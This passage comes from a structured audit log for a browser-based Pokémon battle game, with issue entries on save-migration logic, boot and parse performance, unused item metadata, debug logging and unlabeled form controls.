**Title**: CONFIRMED FIXED — GYM_CITY_LEADER_EVENT is now derived from STORY_EVENTS_RAW at boot (prior audit 1.3)

**Evidence**:
```js
const GYM_CITY_LEADER_EVENT = (function buildGymCityLeaderMap() {
    const out = {};
    for (let i = 0; i < STORY_EVENTS_RAW.length; i++) {
        const row = STORY_EVENTS_RAW[i];
        if (!row || row[1] !== 'Battle') continue;
        const m = String(row[2] || '').match(/^Gym Leader (\d+)$/);
        if (m) out[parseInt(m[1], 10)] = i;
    }
    return out;
})();
```

**Repro**: Prior audit finding 1.3 flagged `GYM_CITY_LEADER_EVENT` as a hard-coded index map fragile to timeline shifts. It is now an IIFE that derives the map by scanning `STORY_EVENTS_RAW` for `Gym Leader N` rows (29743). Used at 38514 + 39330 for hub label/sprite. Timeline-shift-safe.

**Blast radius**: Tier-1 #6 — resolved. The hard-code is gone (not merely shadow-validated; fully derived).

**Fix sketch**: None — confirms the prior P1 is fixed.

**Verification**: Map indices match the array positions of the 8 `Gym Leader N` rows.

---

## <a id="ISSUE-143"></a> ISSUE-143: `isPokeball` flag set on 28 items but never read by the engine — dead metadata

---
id: ISSUE-143
severity: P3
category: data
anchor_symbol: isPokeball
file: data/items.json
agents: [data-integrity-auditor]
fingerprint: 92eb6f313f92
confidence: high
status: wontfix-isPokeball-flag-future-use-forward-compat
---

**Title**: `isPokeball` flag set on 28 items but never read by the engine — dead metadata

**Evidence**:
```bash
$ grep -n "isPokeball\|isPokeBall" battle.html
# (no matches)
$ grep -c "isPokeball" data/items.json
28
```

**Repro**: `grep -nE "isPokeball|isPokeBall" /home/user/battle/battle.html` returns no lines (note: the mandate's spelling is `isPokeBall` with uppercase B, but the actual data uses `isPokeball`). The engine's ball-handling code uses its own `ballKey: 'master' | 'great' | ...` taxonomy in `POKEMART_ITEMS` rows, not the data-file flag.

**Blast radius**: None at runtime — the flag is just inert bytes in the JSON. It's a low-priority data-hygiene concern: future contributors may add a poke-ball entry and forget the (unused) flag, or be confused about which catalog is authoritative. Doc/maintenance friction only.

**Fix sketch**: Either (a) strip the `isPokeball` field from `data/items.json` as part of a periodic data-cleanup pass; or (b) wire the engine's ball-detection helpers (e.g., `_ballChip` flows, `applyBallMultiplier`) to read from the data file's `isPokeball` instead of the ad-hoc `kind:'ball'` rows in `POKEMART_ITEMS`. Option (b) consolidates ball-knowledge into one place but is a non-trivial refactor; option (a) is a one-liner script.

**Verification**: After (a): `grep -c isPokeball data/items.json` returns 0. After (b): boot a wild encounter, throw a Quick Ball at turn 1 — confirm the multiplier still triggers via the new lookup path.

---

## <a id="ISSUE-144"></a> ISSUE-144: 9 legacy gen2 berries (Bitter, Burnt, Gold, Ice, Mint, Miracle, Mystery, PRZ Cure, PSN Cure) have no engine handler

---
id: ISSUE-144
severity: P3
category: data
anchor_symbol: items.json
file: data/items.json
agents: [data-integrity-auditor]
fingerprint: 3ebf781a4419
confidence: medium
status: wontfix-gen2-berries-not-loaded-by-gen9-engine-by-design
---

**Title**: 9 legacy gen2 berries (Bitter, Burnt, Gold, Ice, Mint, Miracle, Mystery, PRZ Cure, PSN Cure) have no engine handler

**Evidence**:
```js
// items.json gen 9 entries — all marked isNonstandard:"Past":
// bitterberry, burntberry, goldberry, iceberry, mintberry, miracleberry,
// mysteryberry, przcureberry, psncureberry
$ grep -E "Bitter Berry|Burnt Berry|Gold Berry|Ice Berry|Mint Berry|Miracle Berry|Mystery Berry|PRZ Cure Berry|PSN Cure Berry" battle.html
# (no matches)
```

**Repro**: Iterate `data/items.json` flat for `isBerry: true`; for each berry name, grep `battle.html`. 68 of 77 distinct berries have at least one name reference (Sitrus, Lum, Salac, Liechi, ...). The remaining 9 are all `isNonstandard: "Past"` entries that were renamed/replaced in gen3+ (Gold Berry → Sitrus Berry, etc.).

**Blast radius**: None today — these berries cannot be held in the gen9-only engine path. The risk is purely hypothetical (a future "play gen2 OU" mode would silently no-op them). The dataset is internally consistent with the `isNonstandard:"Past"` marker.

**Fix sketch**: Optional cleanup — keep them as documented past-only data; or, if a multi-gen toggle is ever added, ship a name-aliasing table mapping legacy berries to their modern equivalents in the engine's berry handler. No action required today.

**Verification**: Decide whether to keep or alias; the current `isNonstandard:"Past"` is correctly signalling "do not instantiate."

---

## <a id="ISSUE-145"></a> ISSUE-145: `delete sm.casinoCoins` cleanup runs on every load, not gated by `_loadedVer`

---
id: ISSUE-145
severity: P3
category: bug
anchor_symbol: load
current_line_hint: ~30896
file: battle.html
agents: [story-mode-investigator]
fingerprint: 35349ce088b7
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `delete sm.casinoCoins` cleanup runs on every load, not gated by `_loadedVer`

**Evidence**:
```js
// battle.html ~30896
// v20: casino runs on gold directly. Drop the legacy coin
// currency silently from old saves.
try { delete sm.casinoCoins; } catch (e) {}
if (!sm.casinoStats || typeof sm.casinoStats !== 'object') sm.casinoStats = {};
try { delete sm.casinoStats.cashier; } catch (e) {}
try { delete sm.profIntroThemePending; } catch (e) {}
```
The pattern is "delete on every load whether or not the field exists". Works correctly because `delete` is idempotent, but is structurally different from the explicit `if (_loadedVer < N)` blocks below it. SAVE_VER is not bumped either (see related fingerprint `1877fb707d44`).

**Repro**: Inspect lines 30896-30901 vs lines 30943-30957. Same kind of operation, different style.

**Blast radius**: DX-only. The implicit `delete` calls are silent and bypass the visible migration ledger.

**Fix sketch**: Wrap in `if (_loadedVer < 20) { ... }` block + bump SAVE_VER. Or, if intentional eternal cleanup, add a comment explaining why these four fields don't follow the `_loadedVer < N` pattern.

**Verification**: After fix, the migration chain reads cleanly from v8 → v20 with no out-of-band deletes.

---

## <a id="ISSUE-146"></a> ISSUE-146: CONFIRMED CLEAN — full migrate chain v8→v21 round-trips pre-v15 saves without crash or party/PC/badge loss

---
id: ISSUE-146
severity: P3
category: bug
anchor_symbol: load
current_line_hint: ~32544
file: battle.html
agents: [story-mode-investigator]
fingerprint: a523f2cc0e8d
confidence: high
status: open
---

**Title**: CONFIRMED CLEAN — full migrate chain v8→v21 round-trips pre-v15 saves without crash or party/PC/badge loss

**Evidence**:
```
PROBE6 (jsdom __storyLoad): from version {8,13,14,15,16,19} → all newVer=21, threw=null, ok=true,
team preserved (Pikachu,Charizard), PC preserved, badges/gold/balls intact, IVs backfilled to 31,
permBoosts refunded as vitamins (atk:2 → protein:2), v8 eventIndex correctly +1 shifted (10→11).
```

**Repro**: `window.__storyLoad()` with `{version:N,...}` for N in 8..19 (see PROBE6). Each `_loadedVer < K` gate fires in strict ascending order (v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18,v19,v20,v21 — the prior P1 about v13/v14 ordering and the v14-skip-at-exactly-v13 are both resolved: v14 is its own `< 14` block). load() wraps each migration in try/catch, clamps eventIndex, validates/drops malformed currentEnemyLock, and on a hard parse failure backs up the raw blob to `pbs_story_save.broken.latest` (BUG-005) instead of silently overwriting.

**Blast radius**: None — this is a positive confirmation that Tier-1 save-migration completeness holds. Recorded so the orchestrator can close the migration concern.

**Fix sketch**: No fix needed. (The only adjacent gap is the v21 egg migration reinterpreting a pre-v21 badge-count as a city index — documented as the deliberate "City N ≈ Gym N" approximation; legacy eggs may hatch a touch earlier than the old Gym-7 gate, which is benign.)

**Verification**: `npm run test:integration` save-migration suite (now exercises real `__storyLoad`, not vacuous JSON round-trip).

---

## <a id="ISSUE-147"></a> ISSUE-147: Engine cold-boot is 2.88 s in jsdom — within the harness target (5 s) but **14× the mandate's 200 ms target**

---
id: ISSUE-147
severity: P3
category: perf
anchor_symbol: loadEngine
current_line_hint: 52
file: tests/helpers/load-engine.js
agents: [performance-profiler]
fingerprint: 28e451a73726
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Engine cold-boot is 2.88 s in jsdom — within the harness target (5 s) but **14× the mandate's 200 ms target**

**Evidence**: `tests/reports/perf.md` (this run, ISO 2026-05-22T07:18:54Z) reports `Cold start: 2854 ms (target: < 5000 ms in jsdom)`. Repeated trial: 2885 ms. The performance-profiler mandate (`agents/performance-profiler.md` line 17) sets the target at **< 200 ms under jsdom**. The harness self-report in `perf-bench.mjs:112` has been silently relaxed to `< 5000 ms` to mask this.

**Repro**: `time node -e 'import("./tests/helpers/load-engine.js").then(m => m.loadEngine()).then(() => console.log("ok"))'` measures ≈ 3 seconds.

**Blast radius**: The mandate's 200 ms target is unrealistic — jsdom has to parse ~50k lines of inlined battle.html, then the engine `loadGameData` synchronously parses 1380 species, 954 moves, 583 items, 314 abilities, 1147 build entries from JSON/CSV. The real bottleneck is JSON.parse + JSDOM document construction, both of which are largely fixed-cost. **Either the target needs updating** (the harness self-report at < 5 s is more realistic for jsdom) **or the engine should split eager loading into lazy/on-demand parsing**. In production browsers the boot is ~1.5–2 s and is hidden behind a splash; this is not user-visible. So this is a **target-mismatch finding**, not a performance regression: clarify which number the project actually targets.

**Fix sketch**: Either (a) update `agents/performance-profiler.md` to set the realistic target at `< 5 s in jsdom / < 2.5 s in production`, or (b) add a flag to `loadGameData` to skip parsing of unused data tables (e.g., the 748 illegal/end-game builds) during test boot.

**Verification**: Either the mandate target is updated to a realistic value, or `loadGameData` gains a `{ lazyBuilds: true }` option and `loadEngine.js` passes it.

---

## <a id="ISSUE-148"></a> ISSUE-148: Test-harness docs promise window.SAVE_VER / window.sm / window.newStoryRun but only StoryMode + __storyLoad are exposed

---
id: ISSUE-148
severity: P3
category: dx
anchor_symbol: loadEngine
current_line_hint: ~48385
file: tests/helpers/load-engine.js
agents: [story-mode-investigator]
fingerprint: 05d7604f22a5
confidence: high
status: open
---

**Title**: Test-harness docs promise window.SAVE_VER / window.sm / window.newStoryRun but only StoryMode + __storyLoad are exposed

**Evidence**:
```
PROBE: win_sm=false, win_newStoryRun=undefined, win_SAVE_VER=undefined
Exposed instead: window.StoryMode (incl .state getter), window.STORY_EVENTS_RAW,
window.storyRngNext, window.__storyLoad, window.__STORY_SAVE_VER
```

**Repro**: `loadEngine()` then read `window.SAVE_VER` → undefined; `window.sm` → undefined; `window.newStoryRun` → undefined. The `inspect-save` skill, this agent's charter, and `run-engine-test` notes all instruct using `window.sm` / `window.SAVE_VER` / `window.newStoryRun`. The real surface is `window.StoryMode.state` (for sm), `window.__STORY_SAVE_VER` (for SAVE_VER), `window.__storyLoad` (for the load/migration entry). New runs go through `StoryMode.startNewRun`, not a `window.newStoryRun`.

**Blast radius**: Every save/story repro a future agent or maintainer writes against the documented names silently no-ops or early-returns (the existing story-flow tests defensively `if (!window.sm) return;` — they pass vacuously when the global is absent). Wastes investigation time.

**Fix sketch**: Either expose the documented aliases on `window` behind the `__testHarness` flag (`window.sm = sm` getter, `window.SAVE_VER = SAVE_VER`, `window.newStoryRun = startNewRun`), or update the skill docs + charter to the real names (`StoryMode.state`, `__STORY_SAVE_VER`, `__storyLoad`). The first is lower-friction for repro authors.

**Verification**: `loadEngine()` → `typeof window.SAVE_VER === 'number'` and `window.sm === window.StoryMode.state`.

---

## <a id="ISSUE-149"></a> ISSUE-149: `console.log` cluster in battle.html — debug noise in shipped code

---
id: ISSUE-149
severity: P3
category: dx
anchor_symbol: loadGameData
current_line_hint: ~9172
file: battle.html
agents: [consistency-auditor]
fingerprint: 2665d2131c90
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `console.log` cluster in battle.html — debug noise in shipped code

**Evidence**:
```js
// 19 console.log sites in battle.html — most under window.__DEBUG_* gates or under
// dev-only seeders. Worst-offender (always-on) sites:
// L9082  console.log('[SpriteScale] enrichBaseStatsHeightsFromDex: heightM added for ' + n + ' species');
// L9172  console.log(`[Data] Loaded ${...} species, ${...} moves, ${...} items, ${...} abilities, ${...} natures`);
// L9342  console.log(`[CSV] Loaded builds for ${Object.keys(csvBuilds).length} Pokémon ...`);
// L9399  console.log(`[CSV] API fallback loaded builds for ${...}`);
// L10939 console.log(`[Smogon] Loaded gen${gen} sets from local file`);
// L10945 console.log(`[Smogon] Loaded gen${gen} sets from pkmn.cc API`);
```

**Repro**: Open battle.html in a browser, open the console — `[Data] Loaded …` and friends greet every visitor on every cold load.

**Blast radius**: Polish only. Shipped console noise distracts from real diagnostics during incident triage. Note: console.log entries inside `__storyXxxTest` / `seedStoryXxx` / `balanceAudit` / `testmoves` are intentional (dev seeders) and should NOT be stripped.

**Fix sketch**: Gate the 5-6 always-on data-load logs behind a `window.__DEBUG_LOADS` flag (the SpriteScale / dex probe pattern already does this — copy it). Keep the dev-seeder logs as-is.

**Verification**: Cold load battle.html in a browser, console should be empty unless `?debug=1` or `__DEBUG_LOADS=true`.

---

## <a id="ISSUE-150"></a> ISSUE-150: Cold boot is ~3.0 s in jsdom (5-process median 3009 ms) — within the harness's relaxed 5 s self-target but 15× the mandate's 200 ms; a target-mismatch to resolve, not a regression

---
id: ISSUE-150
severity: P3
category: perf
anchor_symbol: loadGameData
current_line_hint: 9583
file: battle.html
agents: [performance-profiler]
fingerprint: 56169fe009c6
confidence: high
status: open
---

**Title**: Cold boot is ~3.0 s in jsdom (5-process median 3009 ms) — within the harness's relaxed 5 s self-target but 15× the mandate's 200 ms; a target-mismatch to resolve, not a regression

**Evidence**: 5 fresh node processes: 3270, 3018, 2934, 3009, 3034 ms → median **3009 ms**. Dominated by JSDOM parsing ~48k lines of inlined battle.html + `loadGameData` synchronously parsing species.json (1380), moves.json (954), items.json, abilities.json, and builds.csv. The mandate (performance-profiler) sets < 200 ms; `perf-bench.mjs` self-reports against a relaxed < 5000 ms.

**Repro**: `time node -e 'import("./tests/helpers/load-engine.js").then(m=>m.loadEngine())'` ≈ 3 s, repeatable.

**Blast radius**: jsdom boot is mostly fixed-cost (document construction + JSON.parse) and is hidden behind a splash in production (~1.5–2 s real browser). Not user-facing. The redesign adds more eager data (egg tables, gauntlet rosters, story-pool) — every new JSON table parsed at boot adds to this synchronous path, so the boot budget is worth watching. Flagging as a target-clarity issue + a budget to protect.

**Fix sketch**: Either update the mandate to a realistic jsdom target (< 5 s) / production target (< 2.5 s), or add lazy/on-demand parsing to `loadGameData` (e.g. defer the ~748 illegal/end-game build rows and any new redesign tables until first use) so boot stays flat as data grows.

**Verification**: Re-measure 5-process median; confirm it stays under whichever target the project ratifies, and that adding redesign data tables does not push it past budget.

---

## <a id="ISSUE-151"></a> ISSUE-151: `makeBuild` is flat across power tiers (T1-T4 spread <0.04 ms median) — confirms no per-tier pathology; baseline 0.045 ms median

---
id: ISSUE-151
severity: P3
category: perf
anchor_symbol: makeBuild
current_line_hint: ~10731
file: battle.html
agents: [performance-profiler]
fingerprint: d17c754c4af6
confidence: medium
status: open
---

**Title**: `makeBuild` is flat across power tiers (T1-T4 spread <0.04 ms median) — confirms no per-tier pathology; baseline 0.045 ms median

**Evidence**: T1-T4 means STANDARD / MEGA / TERA / ZMOVE in current code (the `forceGimmick` knob). 10 species × 5 trials each, jsdom harness, `window.__rivalTest.makeBuild`:

| Tier    | n  | Median ms | p95 ms | Max ms | Mean ms |
|---------|----|-----------|--------|--------|---------|
| STANDARD| 50 |     0.045 |  0.257 |  0.686 |   0.088 |
| MEGA    | 50 |     0.014 |  0.028 |  0.104 |   0.018 |
| TERA    | 50 |     0.020 |  0.036 |  0.085 |   0.022 |
| ZMOVE   | 50 |     0.015 |  0.047 |  0.057 |   0.019 |

```js
// battle.html:10731 — gimmick pool is selected via simple object lookup, no per-tier branch difference
if (gimmick === 'MEGA') pool = entry.mega?.length ? entry.mega : [];
else if (gimmick === 'ZMOVE') pool = entry['z-attack']?.length ? entry['z-attack'] : [];
else if (gimmick === 'TERA') pool = entry.tera?.length ? entry.tera : [];
else pool = (entry.regular || []).concat(entry.weather || []);
```

**Repro**: `/tmp/deep-perf2.mjs`, 2026-05-28.

**Blast radius**: A 6-mon team build = 6 `makeBuild` calls ≈ 0.27 ms total. Inside `rollTrainerTeam`'s ~1.4 ms cold call. Negligible. STANDARD's higher max (0.69 ms) comes from the `csvBuildMix` 70/30 designed-vs-CSV split that runs an extra `makeDesignedBuild` lookup on ~30% of calls. The cost is even across tiers, so the mandate's "should be flat across tiers" check passes.

**Fix sketch**: No fix needed. This finding exists to establish the T1-T4 baseline so future regressions are detectable.

**Verification**: Re-bench after any change to `makeBuild`'s pool selection; flag if a tier diverges from the others by >2× median.

---

## <a id="ISSUE-152"></a> ISSUE-152: v15 stable-ID migration only iterates `sm.team`, not `sm.pcBox` (harmless today but inconsistent with v17)

---
id: ISSUE-152
severity: P3
category: dx
anchor_symbol: migrateStoryPreV15
current_line_hint: ~30605
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6aecb8bc20ed
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: v15 stable-ID migration only iterates `sm.team`, not `sm.pcBox` (harmless today but inconsistent with v17)

**Evidence**:
```js
// battle.html ~30605  migrateStoryPreV15
if (Array.isArray(sm.team)) {
    for (const slot of sm.team) {
        if (slot && typeof slot === 'object' && !slot.id) {
            slot.id = 'm_' + Math.random().toString(36).slice(2, 10);
        }
    }
}
// no sm.pcBox iteration

// battle.html ~30633  migrateStoryPreV17 (later fix)
for (const arr of [sm.team, sm.pcBox]) {
    if (!Array.isArray(arr)) continue;
    for (const slot of arr) {
        if (slot && typeof slot === 'object' && !slot.id) {
            slot.id = 'm_' + Math.random().toString(36).slice(2, 10);
        }
    }
}
```
The v15 migration was authored when `sm.pcBox` didn't yet exist (PC was introduced in v15), so the gap is moot in practice. But v17 had to follow up specifically because the v15 ID-stamping didn't cover pcBox. Today, on a pre-v15 save: v15 stamps team IDs → v17 stamps pcBox IDs (newly-created by `migrateStoryPreV15`'s `if (!Array.isArray(sm.pcBox)) sm.pcBox = []` — so pcBox is empty array, no IDs to stamp). Safe.

**Repro**: Trace a fresh v15 → v17 → v19 migration of a pre-v15 save. pcBox is empty after v15, so no IDs are missed.

**Blast radius**: None — purely a consistency note for clarity.

**Fix sketch**: Either accept the historical sequencing (no action), or backport the v17 pattern into v15 for cleaner reading: `for (const arr of [sm.team, sm.pcBox]) { ... }`. Behavior unchanged either way.

**Verification**: Round-trip a pre-v15 save through the chain; PCs all have IDs.

---

## <a id="ISSUE-153"></a> ISSUE-153: Pre-v15 saves get 0 Poké Balls instead of the intended 5 — migrateStoryPreV15 balls default is shadowed by the default sm object

---
id: ISSUE-153
severity: P3
category: bug
anchor_symbol: migrateStoryPreV15
current_line_hint: ~32155
file: battle.html
agents: [story-mode-investigator]
fingerprint: 1839297b78a2
confidence: high
status: open
---

**Title**: Pre-v15 saves get 0 Poké Balls instead of the intended 5 — migrateStoryPreV15 balls default is shadowed by the default sm object

**Evidence**: `migrateStoryPreV15` (~32155) intends to seed old saves with a starting ball kit:
```js
if (!sm.balls || typeof sm.balls !== 'object') sm.balls = { poke: 5, great: 0, ultra: 0, master: 0 };
```
But the module-singleton `sm` is initialized with `balls: { poke: 0, great: 0, ultra: 0, master: 0 }` (~32242). `load()` does `Object.assign(sm, d)`; a pre-v15 save predates the catch system and has NO `balls` field, so `sm.balls` retains the default `{poke:0}` object. The migration's `if (!sm.balls...)` is therefore false and the `poke:5` branch never runs.

**Repro**: `node scripts/debug/_repro/balls-migration.mjs` → loads a `version:8` save with no `balls` field; result is `{poke:0,...}` not `{poke:5,...}`.

**Blast radius**: Narrow — only genuine pre-v15 saves (predating the v15 catch/PC/balls schema). They start the post-migration session unable to catch until they buy/earn balls. Recoverable, not a crash.

**Fix sketch**: In `migrateStoryPreV15`, explicitly seed `sm.balls.poke = Math.max(5, sm.balls.poke|0)` (or detect the pre-v15 marker — e.g. absence of `sm.catchUnlocked` in the raw save `d`) rather than relying on `!sm.balls`. The same default-shadowing pattern affects any migration that uses `if (!sm.X)` for a field the default `sm` already initializes.

**Verification**: Re-run the repro; `sm.balls.poke` should be 5 after migrating a pre-v15 save.

---

## <a id="ISSUE-154"></a> ISSUE-154: Online Host/Join form labels are not programmatically associated with their inputs

---
id: ISSUE-154
severity: P3
category: a11y
anchor_symbol: modal-online-host
current_line_hint: ~7637
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: bdcd17777e9c
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Online Host/Join form labels are not programmatically associated with their inputs

**Evidence**:
```html
<!-- modal-online-host at ~7637 -->
<label style="display:block;font-size:12px;margin:10px 0 4px;">Your display name</label>
<input id="online-host-name" maxlength="24" placeholder="Host" style="…">

<!-- modal-online-pvp at ~7673 -->
<label style="display:block;font-size:12px;margin:8px 0 4px;">Your name (leaderboard)</label>
<input id="online-join-name" maxlength="24" placeholder="Trainer" style="…">
<label style="display:block;font-size:12px;margin:10px 0 4px;">Room code</label>
<input id="online-join-code" maxlength="8" style="…">
```

The `<label>` elements are visually adjacent to the inputs but missing `for="online-host-name"`/etc., and the inputs lack `aria-labelledby`/`aria-label`. SR users hear "edit text" with no name; clicking the label does not focus the input. Contrast with the trainer-create form at ~8370 which uses the wrapping-`<label>` pattern correctly.

**Repro**: Open Online → Host with VoiceOver → Tab to first text field → announced as "edit text" with no name.

**Blast radius**: Two modals, three inputs. Small surface but trivial to fix and a common heuristic that linting catches.

**Fix sketch**: Either add `for="online-host-name"` (etc.) on the labels, or wrap each label/input pair into a single `<label>` element following the pattern used in `screen-story-trainercreate`.

**Verification**: SR announces "Your display name, edit text" on focus; clicking the label focuses the input.

---

## <a id="ISSUE-155"></a> ISSUE-155: CONFIRMED FIXED — Mystery Figure is now a rotating 10-identity cast (prior audit: hardcoded Cyrus)

---
id: ISSUE-155
severity: P3
category: inconsistency
anchor_symbol: MYSTERY_FIGURE_IDENTITIES
current_line_hint: ~29759
file: battle.html
agents: [story-mode-investigator]
fingerprint: 91bb9bebbb7a
confidence: high
status: open
---

**Title**: CONFIRMED FIXED — Mystery Figure is now a rotating 10-identity cast (prior audit: hardcoded Cyrus)

**Evidence**:
```js
const MYSTERY_FIGURE_IDENTITIES = {
    cyrus:{...}, ghetsis:{...}, cynthia:{...}, steven:{...}, n:{...},
    red:{...}, lance:{...}, buried_alive:{...}, cartridge_self:{...}
};
function _storyEnsureMysteryIdentity() { if (!sm.mysteryIdentity || ...) sm.mysteryIdentity = _storyPickMysteryIdentity(); ... }
```

**Repro**: Prior audit flagged the Mystery Figure sprite as "unconditionally Cyrus". Now `sm.mysteryIdentity` is rolled once per run (`_storyPickMysteryIdentity`, 29807) from 10 identities, each with per-identity intro lines + outro. The city-hub tease (38613) and the post-HoF boss both read the same pinned identity. Two are storyline-exclusive (`buried_alive`, `cartridge_self`) with `mysteryBias` weighting. Tier-2 #8 resolved.

**Blast radius**: Fanservice — resolved. Minor residual: the fallback at 38614 is still `'Cyrus'` if `sm.mysteryIdentity` is somehow unset at render time, but `_storyEnsureMysteryIdentity` makes that path effectively dead.

**Fix sketch**: None required. Optionally drop the literal `'Cyrus'` fallback in favor of `_storyEnsureMysteryIdentity().sprite` for consistency.

**Verification**: Start two runs; confirm different pinned mystery identities and matching intro/outro voice.

---

## <a id="ISSUE-156"></a> ISSUE-156: A cluster of form controls lack accessible names (online host/join, casino bet, gauntlet opt-in)

---
id: ISSUE-156
severity: P3
category: a11y
anchor_symbol: online-host-format
current_line_hint: ~8113
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 8407ee14cfc4
confidence: medium
status: open
---

**Title**: A cluster of form controls lack accessible names (online host/join, casino bet, gauntlet opt-in)

**Evidence**:
```html
<select id="online-host-format" ...>           <!-- no label / aria-label -->
<input id="online-join-code" maxlength="8" ...> <!-- no label, no placeholder -->
<input id="story-casino-flip-bet" type="number" value="50"> <!-- no label -->
```

**Repro**: SR announces these as unlabeled "edit text" / "combo box". Affects online host format/timer selects (L8113/8119), join name/code inputs (L8146/8148), casino flip/roulette bet inputs (L8640/8701), gauntlet leaderboard opt-in (L8212). Note: Settings rows (L7996+), trainer-create name (L8919) and gen/mech checkboxes are correctly labeled — this is a contained cluster, mostly in the online/casino surfaces.

**Blast radius**: Online lobby, casino mini-games, gauntlet leaderboard. Low story-mode-core impact but trivial to fix.

**Fix sketch**: Add `aria-label` (or wrap/associate a visible `<label for=…>`) on each listed control. Mirror the already-correct pattern used in `#modal-settings`.

**Verification**: SR speaks a meaningful name for every input/select on these screens.

---

## <a id="ISSUE-157"></a> ISSUE-157: `parseCSV` of `data/builds.csv` (2.6 MB, 17,397 rows) blocks the main thread for **180 ms median** during boot

---
id: ISSUE-157
severity: P3
category: perf
anchor_symbol: parseCSV
current_line_hint: ~9695
file: battle.html
agents: [performance-profiler]
fingerprint: 94ecaa3ab57f
confidence: high
status: open
---

**Title**: `parseCSV` of `data/builds.csv` (2.6 MB, 17,397 rows) blocks the main thread for **180 ms median** during boot

**Evidence**:
```js
// battle.html:9695 — char-at-a-time scan, no streaming, runs synchronously
function parseCSV(text, delim) {
    const norm = String(text || '').replace(/\r\n/g, '\n').replace(/\r/g, '\n');
    ...
    let lines = norm.trim().split('\n'), headers = parseCSVLine(lines[0], delim), rows = [];
    for (let i = 1; i < lines.length; i++) { ...; let vals = parseCSVLine(lines[i], delim); ...; rows.push(obj); }
    return rows;
}
function parseCSVLine(line, delim) {
    // single-char loop with mutation of `current` per char
    for (let i = 0; i < line.length; i++) { ... }
}
```

**Repro**: Re-parsed the live `data/builds.csv` (2,623 KB, 17,399 lines) 5× via `window.parseCSV` after boot: **trials 173 / 192 / 262 / 285 / 152 ms — median 192 ms, max 285 ms** for 17,397 rows. JSON.parse of *all five* JSON tables combined is 25 ms; CSV alone is **7× slower than the entire JSON pipeline**. (`/tmp/deep-perf4.mjs`, 2026-05-28.)

**Blast radius**: `loadBuildsCSV` is awaited in the boot critical path (battle.html:10143) before "Initializing engine (4/4)" appears. On a real browser, 180 ms is a single dropped frame at 60 Hz; on a mobile device the parse can easily blow past 300 ms and is one of the bigger contributors to the post-splash hang. The mandate item *"is the parse blocking the main thread? Could it stream?"* — yes, it blocks, and yes, it could either run off-main (Web Worker), be parsed lazily on first draft, or be pre-encoded as JSON during build (saves the per-char parser entirely).

**Fix sketch**: Three options, in cost order. (1) Cheapest: replace the per-char `parseCSVLine` with `split(',')` for the 95% of rows that contain no embedded commas + a quote-aware fallback for the few that do — measure expected ~3-5× speedup. (2) Move `loadBuildsCSV` out of the boot path; only the in-battle build resolver needs it, splash + main menu do not. (3) Pre-encode the CSV as `data/builds.json` during the existing `scripts/build-sprite-manifest.mjs`-style build step; `JSON.parse` is ~7× faster and is implemented in C++ in V8.

**Verification**: Re-time `loadBuildsCSV()` standalone; with option (2) the eager boot drops by ~180 ms and the deferred load happens during draft animation slack. With option (3), the same blob loads in ~25 ms. Confirm with `node --expose-gc scripts/debug/perf-bench.mjs` and the median boot ms.

---

## <a id="ISSUE-158"></a> ISSUE-158: `parseMoveEffects` per-move latency varies by ~315× between fastest and slowest moves; outliers are 25–250× the median

---
id: ISSUE-158
severity: P3
category: perf
anchor_symbol: parseMoveEffects
current_line_hint: 24269
file: battle.html
agents: [performance-profiler]
fingerprint: 4cae7cf40971
confidence: high
status: open
---

**Title**: `parseMoveEffects` per-move latency varies by ~315× between fastest and slowest moves; outliers are 25–250× the median

**Evidence**: drill-down via `scripts/debug/_repro/parse-move-drill.mjs` (boots harness, calls `parseMoveEffects(attacker, defender, move, true)` for all 950 moves with valid mons):
```
Total moves measured: 950
Median (all):          0.014 ms
Median (damaging):     0.014 ms  N=679
Median (status):       0.014 ms  N=271
Median (has secondary):0.017 ms  N=203
Median (no secondary): 0.013 ms  N=747

Top 10 slowest:
  3.463 ms  Status  secondary=false  Clangorous Soul
  3.396 ms  Status  secondary=false  Acid Armor
  3.381 ms  Status  secondary=false  Baby-Doll Eyes
  2.819 ms  Special secondary=true   Night Daze
  2.557 ms  Special secondary=false  10,000,000 Volt Thunderbolt
  2.128 ms  Special secondary=false  Incinerate
  1.963 ms  Status  secondary=false  Calm Mind
  1.851 ms  Status  secondary=false  Extreme Evoboost
  1.824 ms  Status  secondary=false  Bulk Up
  1.808 ms  Status  secondary=false  Shell Smash

Bottom 5 fastest: ~0.011 ms
```
Fastest:slowest ratio ≈ 0.011 → 3.46 = **315×**. The mandate's threshold is >10× variance → P3 finding.

**Repro**: `node scripts/debug/_repro/parse-move-drill.mjs` (script is in the gitignored `_repro/` folder; reproducible from the snippet documented here).

**Blast radius**: At normal sub-millisecond times these spikes are invisible. But (a) Clangorous Soul, Calm Mind, Bulk Up, Shell Smash, Acid Armor are setup moves used heavily in trainer sets, and they all involve **multi-stat boost loops** with logMsg/updateUI sequences — those are the slowest. (b) JSDOM happens to evaluate updateUI's DOM mutations cheaply; in a real browser those same moves will pay real layout/paint cost, so the relative spike could grow. (c) The top three are all `Status` moves with no secondary, suggesting the slow path is the boost-stage loop, not the secondary-effect branch. Status moves are NOT slower than damaging moves on the median — only the multi-stat-boost subset is.

**Fix sketch**: Profile Clangorous Soul (boosts ATK/DEF/SPA/SPD/SPE by +1, costs 33% HP) — that's 5 sequential `changeStage` calls + the HP cut + a logMsg. If the cost is dominated by `updateUI` being called inside `changeStage`, batch the UI update once at the end. If the cost is `logMsg` overhead per stage, that suggests the per-message channel switching path is the hot spot. Not urgent — even the worst move is 3.5 ms, well under any human-perceptible threshold in jsdom.

**Verification**: Re-run the drill script after any optimization. The expectation is the slowest moves drop into the sub-millisecond range and the variance ratio falls below 20×.

---

## <a id="ISSUE-159"></a> ISSUE-159: `parseMoveEffects` per-move latency varies ~257× (median 0.012 ms, slowest 3.19 ms) — multi-stat-boost / "dance" moves are the outliers

---
id: ISSUE-159
severity: P3
category: perf
anchor_symbol: parseMoveEffects
current_line_hint: 25255
file: battle.html
agents: [performance-profiler]
fingerprint: 45d50d234dfb
confidence: high
status: open
---

